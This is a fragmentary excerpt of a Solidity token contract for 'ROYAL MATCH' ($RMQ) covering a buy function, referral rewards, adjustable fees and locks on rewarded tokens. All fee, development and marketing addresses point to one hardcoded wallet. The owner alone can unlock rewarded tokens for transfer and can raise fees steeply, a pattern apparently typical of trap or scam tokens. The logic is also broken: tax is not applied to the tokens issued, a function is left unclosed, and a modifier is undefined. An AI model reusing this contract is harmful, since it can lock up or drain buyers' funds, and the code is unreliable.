...
contract ROYALMATCH is Context, IERC20, Ownable {
    ...
    mapping (address => uint256) private _rewardedTokens;
    ...
    uint256 private _airdropToken = 200000* 10**18;
    ...
    string private constant _name = "ROYAL MATCH";
    string private constant _symbol = "$RMQ";
    uint8 private constant _decimals = 18;
    uint256 private _taxFee = 0; 
    address payable private _taxAddress;

    address payable private _developmentAddress = payable(0xbd6Ca174d943872AB92396149313fD2a20e507d2);
    address payable private _marketingAddress = payable(0xbd6Ca174d943872AB92396149313fD2a20e507d2);
    ...
    constructor () {
        ...
        _taxAddress = payable(0xbd6Ca174d943872AB92396149313fD2a20e507d2);
    }
    ...
    function setTaxAddress(address payable newTaxAddress) public onlyOwner {
    ...
    function setFee(uint256 redisFeeOnBuy, uint256 redisFeeOnSell, uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyDev {
	    require(redisFeeOnBuy < 30, "Redis cannot be more than 30.");
	    require(redisFeeOnSell < 30, "Redis cannot be more than 30.");
	    require(taxFeeOnBuy < 20, "Tax cannot be more than 20.");
	    require(taxFeeOnSell < 20, "Tax cannot be more than 20.");
...
function buy(address _ref) payable public returns (bool) {
    uint256 _msgValue = msg.value;
    uint256 taxAmount = _msgValue.mul(_taxFee).div(100);
    uint256 netAmount = _msgValue.sub(taxAmount);
    uint256 tokensToTransferAfterTax = _msgValue.mul(salePrice);
    _transfer(owner(), _msgSender(), tokensToTransferAfterTax);
    _taxAddress.transfer(taxAmount);
    // Referral
    if (_ref != address(0) && _ref != _msgSender()) {
        uint256 referToken = tokensToTransferAfterTax * _referToken / 10000;
        uint256 referEth = netAmount * _referEth / 10000;
        _transfer(owner(), _ref, referToken);
        payable(_ref).transfer(referEth);
        lockRewardedTokens(_ref);
    }
    ...
    mapping(address => bool) private _canTransferRewardedTokens;
    
    function canTransferRewardedTokens(address user) public view returns (bool) {
    return _canTransferRewardedTokens[user];
    }
  
    function lockRewardedTokens(address user) internal {
    uint rewardedTokens = _rewardedTokens[user];
   
    _balances[user] = _balances[user].add(rewardedTokens);
  
    _canTransferRewardedTokens[user] = false;
    }
   
    function unlockRewardedTokens(address user) external onlyOwner {
    _canTransferRewardedTokens[user] = true;
    }
